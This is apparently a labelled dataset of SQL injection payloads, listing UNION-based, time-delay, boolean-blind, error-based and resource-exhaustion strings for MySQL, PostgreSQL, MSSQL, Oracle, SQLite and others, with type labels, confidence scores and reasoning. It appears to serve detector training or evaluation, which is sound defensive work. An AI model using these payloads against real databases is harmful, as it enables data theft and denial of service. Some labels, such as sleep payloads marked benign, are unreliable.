id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
22262,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) ) ||'",time_blind,mysql,0.85,time-delay signal (BENCHMARK 5000000); MySQL signature; Type=time_blind (Priority 5); benchmark DoS,2
22263,"-6440 ) ) ) union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",union_based,generic,0.85,UNION SELECT with 10 columns; Type=union_based (Priority 7); column count,2
22264,"-9924 ) ) as zgqa where 2867 = 2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",union_based,generic,0.85,UNION SELECT with 10 columns; Type=union_based (Priority 7); column count,2
22265,1 ) as gfhf where 5804 = 5804 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.85,PostgreSQL time-delay via pg_sleep; Type=time_blind (Priority 5); sleep-based injection,2
22266,"1"" ) as dgzf where 4834 = 4834",benign,generic,0.5,generic SQL structure without attack signal; Type=benign (Priority 1); no injection,1
22267,-4324 order by 1--,benign,generic,0.5,ORDER BY clause without injection context; Type=benign (Priority 1); no attack signal,1
22268,"-8557 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",heavy_query,generic,0.85,Heavy cardinality via GROUP BY floor(rand); Type=heavy_query (Priority 4); DoS,2
22269,end--,benign,generic,0.5,generic SQL keyword without injection context; Type=benign (Priority 1); no attack,1
22270,"1"" ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""ugtw"" = ""ugtw",heavy_query,postgresql,0.85,PostgreSQL generate_series DoS with 5000000 scale; Type=heavy_query (Priority 4); cardinality attack,2
22271,1 ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( 4279 = 4279,boolean_blind,mysql,0.7,Pattern match: RLIKE conditional; Type=boolean_blind (Priority 3); subquery condition,1
22272,1%' ) ) rlike sleep ( 5 ) #,time_blind,mysql,0.85,time-delay signal (RLIKE+SLEEP); MySQL signature; Type=time_blind (Priority 5); sleep-based,2
22273,"1' and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.7,MSSQL sysusers table join; Type=boolean_blind (Priority 3); cardinality check,1
22274,"1 ) ) as fwru where 5262 = 5262 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",boolean_blind,generic,0.7,Generic SQL structure without specific attack signal; Type=boolean_blind (Priority 3); conditional pattern,1
22275,"1"" ) as xwnu where 6490 = 6490 union all select null,null,null,null,null,null--",union_based,generic,0.85,UNION SELECT with NULL columns; Type=union_based (Priority 7); column count,2
22276,1' ) as wpmv where 1479 = 1479 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,error_based,oracle,0.85,Oracle-specific function (xmltype); error-based injection; Type=error_based (Priority 4),2
22277,"1 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",heavy_query,sqlite,0.85,SQLite time-delay via randomblob large scale; Type=heavy_query (Priority 4); DoS attack,2
22278,1' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and 'bwtk' = 'bwtk,time_blind,mysql,0.7,time-delay signal (SLEEP function); MySQL signature; Type=time_blind (Priority 5); subquery sleep,1
22279,"-8754"" ) ) ) union all select 7391,7391,7391,7391,7391,7391,7391--",union_based,generic,0.85,UNION SELECT with 7 columns; Type=union_based (Priority 7); column count,2
22280,"-4406%' union all select 9599,9599,9599,9599#",union_based,generic,0.85,UNION SELECT with 4 columns; Type=union_based (Priority 7); column count,2
22281,"1 ) as rnfb where 2405 = 2405 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.85,time-delay signal (BENCHMARK 5000000); MySQL signature; Type=time_blind (Priority 5); benchmark DoS,2
22282,1 ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,0.7,time-delay signal (SLEEP function); MySQL signature; Type=time_blind (Priority 5); subquery sleep,1
22283,1 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) # cykf,boolean_blind,generic,0.7,Generic SQL structure without specific attack signal; Type=boolean_blind (Priority 3); conditional pattern,1
22284,"select benchmark ( 5000000,md5 ( 0x714e4153 ) ) #",time_blind,mysql,0.85,time-delay signal (BENCHMARK 5000000); MySQL signature; Type=time_blind (Priority 5); benchmark DoS,2
22285,"1%' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( '%' = '",time_blind,mysql,0.85,time-delay signal (BENCHMARK 5000000); MySQL signature; Type=time_blind (Priority 5); benchmark DoS,2
22286,"-6550' ) where 1675 = 1675 union all select 1675,1675,1675,1675,1675,1675,1675--",union_based,generic,0.85,UNION SELECT with 7 columns; Type=union_based (Priority 7); column count,2
22287,"1' ) where 1804 = 1804 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.85,error-based function (extractvalue) with benchmark; Type=error_based (Priority 4); xpath error,2
22288,1 ) as uuro where 6784 = 6784,benign,generic,0.5,generic SQL structure without attack signal; Type=benign (Priority 1); no injection,1
22289,-7720 ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 8254 = 8254,boolean_blind,generic,0.7,Generic SQL structure without specific attack signal; Type=boolean_blind (Priority 3); conditional pattern,1
22290,"1 ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 9325 = 9325",heavy_query,mysql,0.85,Heavy cardinality with row() comparison; Type=heavy_query (Priority 4); DoS,2
22291,"1, ( select ( case when ( 5154 = 5154 ) then 1 else 5154* ( select 5154 from master..sysdatabases ) end ) )",boolean_blind,mssql,0.7,Boolean CASE expression with error fallback; Type=boolean_blind (Priority 3); MSSQL conditional,1
22292,"-6014"" or make_set ( 3003 = 2609,2609 )",benign,generic,0.5,Generic SQL keywords without clear injection signal; Type=benign (Priority 1); no attack,1
22293,1 ) where 6424 = 6424,benign,generic,0.5,generic SQL structure without attack signal; Type=benign (Priority 1); no injection,1
22294,1%' or sleep ( 5 ) #,benign,mysql,0.5,Unclear injection context without proper WHERE clause; Type=benign (Priority 1); incomplete pattern,1
22295,1' or sleep ( 5 ) and 'yudo' = 'yudo,benign,generic,0.5,Unclear injection context without proper WHERE clause; Type=benign (Priority 1); incomplete pattern,1
22296,1'|| ( select 'sxya' where 3578 = 3578,boolean_blind,generic,0.7,generic SQL keywords without specific attack signal; Type=boolean_blind (Priority 3); partial injection,1
22297,"1"" ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( ""nrhz"" like ""nrhz",boolean_blind,generic,0.7,MSSQL sysusers table join; Type=boolean_blind (Priority 3); cardinality check,1
22298,"select * from generate_series ( 7667,7667,case when ( 7667 = 8232 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,0.7,PostgreSQL generate_series with CASE; Type=boolean_blind (Priority 3); conditional logic,1
22299,"1' ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'lxoc' = 'lxoc",heavy_query,mysql,0.85,Heavy cardinality via IF and large number; Type=heavy_query (Priority 4); DoS,2
22300,"1' where 4150 = 4150 and elt ( 8012 = 6026,6026 ) --",boolean_blind,mysql,0.7,boolean blind (ELT conditional); MySQL signature; Type=boolean_blind (Priority 3); ELT evaluation,1
22301,"1,iif ( 6333 = 1227,1,1/0 )",benign,mssql,0.5,Generic SQL keywords without clear injection signal; Type=benign (Priority 1); no attack,1
22302,"1 ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.7,DB2 system table join (sysibm.systables); Type=boolean_blind (Priority 3); cardinality check,1
22303,"1"" ) as jqli where 7793 = 7793",benign,generic,0.5,generic SQL structure without attack signal; Type=benign (Priority 1); no injection,1
22304,1' ) ) ) and 6991 = 5579,boolean_blind,generic,0.7,Pattern match: boolean condition (AND inequality); Type=boolean_blind (Priority 3); conditional check,1
22305,1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ),time_blind,postgresql,0.85,PostgreSQL time-delay via pg_sleep; Type=time_blind (Priority 5); sleep-based injection,2
22306,1 where 1568 = 1568 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,0.7,time-delay signal (SLEEP function); MySQL signature; Type=time_blind (Priority 5); subquery sleep,1
22307,"1 ) as idvt where 3490 = 3490 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,generic,0.7,Oracle all_users table join; Type=boolean_blind (Priority 3); cardinality check,1
22308,"1"" and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.85,SQLite time-delay via randomblob large scale; Type=heavy_query (Priority 4); DoS attack,2
22309,"1' where 1093 = 1093 union all select null,null,null,null,null,null,null--",union_based,generic,0.85,UNION SELECT with NULL columns; Type=union_based (Priority 7); column count,2
22310,( select * from ( select ( sleep ( 5 ) ) ) acdk ) #,time_blind,mysql,0.7,time-delay signal (SLEEP function); MySQL signature; Type=time_blind (Priority 5); subquery sleep,1
22311,1'+ ( select 'kcix' where 1117 = 1117,boolean_blind,generic,0.7,generic SQL keywords without specific attack signal; Type=boolean_blind (Priority 3); partial injection,1
22312,1'+ ( select 'jaok' where 2592 = 2592,boolean_blind,generic,0.7,generic SQL keywords without specific attack signal; Type=boolean_blind (Priority 3); partial injection,1
22313,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'ossj' = 'ossj",heavy_query,mysql,0.85,time-delay signal (BENCHMARK 5000000); Type=heavy_query (Priority 4); MySQL DoS,2
22314,"1' ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( 'aqdj' = 'aqdj",error_based,mysql,0.85,error-based function (extractvalue) with benchmark; Type=error_based (Priority 4); xpath error,2
22315,"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",heavy_query,sqlite,0.85,SQLite time-delay via randomblob large scale; Type=heavy_query (Priority 4); DoS attack,2
22316,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""pdqm"" like ""pdqm",heavy_query,generic,0.85,Heavy cardinality via regexp_substring repeat; Type=heavy_query (Priority 4); DoS attack,2
22317,"1',exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 7759 = 7759,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",heavy_query,mysql,0.85,error-based function (EXP overflow); Type=heavy_query (Priority 4); DoS via exp(),2
22318,"1"" ) ) as jebl where 3464 = 3464",benign,generic,0.5,generic SQL structure without attack signal; Type=benign (Priority 1); no injection,1
22319,"-3632' or make_set ( 9354 = 9354,7185 ) and 'lgpy' like 'lgpy",benign,mysql,0.5,Generic SQL keywords without clear injection signal; Type=benign (Priority 1); no attack,1
22320,-5147 or ( 8459 = 8459 ) *4906,benign,generic,0.5,Arithmetic operations without injection context; Type=benign (Priority 1); no SQLi signal,1
22321,"1' ) ) union all select null,null,null,null,null,null,null#",union_based,generic,0.85,UNION SELECT with 7 NULL columns; Type=union_based (Priority 7); column count,2
22322,"1"" ) as bksv where 5375 = 5375",benign,generic,0.5,generic SQL structure without attack signal; Type=benign (Priority 1); no injection,1
22323,"-3017"" ) ) as ljit where 9128 = 9128 union all select 9128,9128,9128,9128,9128--",union_based,generic,0.85,UNION SELECT with 5 columns; Type=union_based (Priority 7); column count,2
22324,"1' ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'dreq' = 'dreq",heavy_query,sqlite,0.85,SQLite time-delay via randomblob large scale; Type=heavy_query (Priority 4); DoS attack,2
22325,"1%"" ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ""%"" = """,boolean_blind,mysql,0.7,Pattern match: RLIKE conditional; Type=boolean_blind (Priority 3); subquery condition,1
22326,1 ) where 6039 = 6039 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,boolean_blind,generic,0.7,Generic SQL structure without specific attack signal; Type=boolean_blind (Priority 3); conditional pattern,1
22327,"-4371' ) ) ) union all select 7465,7465,7465,7465,7465,7465,7465#",union_based,generic,0.85,UNION SELECT with 7 columns; Type=union_based (Priority 7); column count,2
22328,1 ) and 7533 = 7533,boolean_blind,generic,0.7,Pattern match: boolean condition (AND equality); Type=boolean_blind (Priority 3); conditional check,1
22329,"1 ) where 9371 = 9371 union all select null,null,null,null,null,null,null--",union_based,generic,0.85,UNION SELECT with NULL columns; Type=union_based (Priority 7); column count,2
22330,"1, ( select ( case when ( 3902 = 3902 ) then ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) else 1/ ( select 0 from dual ) end ) from dual )",boolean_blind,oracle,0.7,Oracle all_users table join; Type=boolean_blind (Priority 3); cardinality check,1
22331,1%' union all select null--,union_based,generic,0.85,UNION SELECT with NULL columns; Type=union_based (Priority 7); column count,2
22332,"1"" ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""xtyt"" = ""xtyt",boolean_blind,generic,0.7,Generic SQL structure with table join; Type=boolean_blind (Priority 3); cardinality check,1
22333,"select sleep ( 5 ) and ( ( ""twed"" like ""twed",time_blind,mysql,0.85,time-delay signal (SLEEP function); MySQL signature; Type=time_blind (Priority 5); sleep-based,2
22334,1' where 8729 = 8729,benign,generic,0.5,generic SQL structure without attack signal; Type=benign (Priority 1); no injection,1
22335,"1' ) ) and elt ( 4249 = 4249,7259 ) and ( ( 'xjns' = 'xjns",boolean_blind,mysql,0.7,boolean blind (ELT conditional); MySQL signature; Type=boolean_blind (Priority 3); ELT evaluation,1
22336,"-3667%' ) ) union all select 3560,3560,3560--",union_based,generic,0.85,UNION SELECT with 3 columns; Type=union_based (Priority 7); column count,2
22337,"-8655 ) where 3910 = 3910 union all select 3910,3910#",union_based,generic,0.85,UNION SELECT with 2 columns; Type=union_based (Priority 7); column count,2
22338,"waitfor delay '0:0:5' and ""cvqn"" like ""cvqn",time_blind,mssql,0.85,MSSQL time-delay function (WAITFOR DELAY); Type=time_blind (Priority 5); Database=mssql,2
22339,-5569' ) as cjaf where 3753 = 3753 union all select 3753#,union_based,generic,0.85,UNION SELECT structure; Type=union_based (Priority 7); column count,2
22340,1 ) where 9078 = 9078 rlike sleep ( 5 ) #,time_blind,mysql,0.85,time-delay signal (RLIKE+SLEEP); MySQL signature; Type=time_blind (Priority 5); sleep-based,2
22341,"1' ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 'tkcy' like 'tkcy",boolean_blind,db2,0.7,DB2 system table join (sysibm.systables); Type=boolean_blind (Priority 3); cardinality check,1
22342,-2210' or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'myvr' like 'myvr,boolean_blind,firebird,0.7,Firebird RDB$database reference; Type=boolean_blind (Priority 3); conditional logic,1
